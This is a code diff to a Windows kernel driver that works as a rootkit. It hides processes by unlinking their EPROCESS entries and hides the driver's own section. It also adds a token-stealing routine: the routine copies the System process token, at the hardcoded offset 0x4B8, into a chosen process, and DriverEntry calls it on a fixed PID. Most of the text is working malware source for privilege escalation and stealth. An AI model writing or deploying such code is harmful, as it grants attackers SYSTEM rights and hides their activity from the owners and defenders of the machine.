@@ -1,7 +1,6 @@
 #include "Driver.h"
 
 
-#pragma warning (disable : 4100 4201)
 
 
 
@@ -43,9 +42,8 @@ int SearchAndRemoveEPROCESSbyOffset(int offset, char *target) {
         if (strcmp(name, target) == 0) {
             int pid = *(int*)((unsigned char*)process + 0x440);
             HideProcess(pid);
-            *(int*)((unsigned char*)process + 0x440) = NULL;//is this illegal ?
-            DbgPrintEx(0, 0, "PID: %d\n", pid);
-            return pid;
+            //*(int*)((unsigned char*)process + 0x440) = 0xffffcafe;//is this illegal ?
+            DbgPrintEx(0, 0, "PID : %d\n", pid);
         }
     }
 
@@ -94,14 +92,32 @@ int HideDriverSection(PDRIVER_OBJECT DriverObject) {
     DbgPrintEx(0, 0, "Driver should be hidden\n");
     return 1;
 }
-int HideSpecificRegKey() {
+int ElevateSpecificPID(int targetPID) {
+    PEPROCESS currentproc = PsGetCurrentProcess();//System
+    PEX_FAST_REF Token = (PEX_FAST_REF)((unsigned char*)currentproc + 0x4B8);//Token offset
+    PEPROCESS pidEPROCESS;
+    NTSTATUS result = PsLookupProcessByProcessId((HANDLE)targetPID, &pidEPROCESS);
+
+    if (result == STATUS_INVALID_PARAMETER) {
+        DbgPrint("An invalid parameter was passed to a service or function. (PID not found) (0xC000000D)");
+        return -1;
+    }
+    else if (result == STATUS_INVALID_CID) {
+        DbgPrint("An invalid client ID was specified. (0x0xC000000B)");
+        return -1;
+    }
+    if (result != STATUS_SUCCESS) {
+        DbgPrint("Unknow PsLookupProcessByProcessId error !!!");
+    }
+    memcpy(((unsigned char*)pidEPROCESS + 0x4B8), Token, sizeof(PEX_FAST_REF));//normalement ça passe
     return 0;
 }
 NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject,_In_ PUNICODE_STRING RegistryPath){
     // NTSTATUS variable to record success or failure
     DbgPrintEx(0, 0, "Hey from kernel ! now testing...\n");
     DriverObject->DriverUnload = OnUnload;
-    //SearchEPROCESSbyOffset(GetImageFileNameOffset("System"), "explorer.exe");
+    ElevateSpecificPID(4524);
+    //SearchAndRemoveEPROCESSbyOffset(GetImageFileNameOffset("System"), "firefox.exe");
     //HideDriverSection(DriverObject);
     return STATUS_SUCCESS;
 }
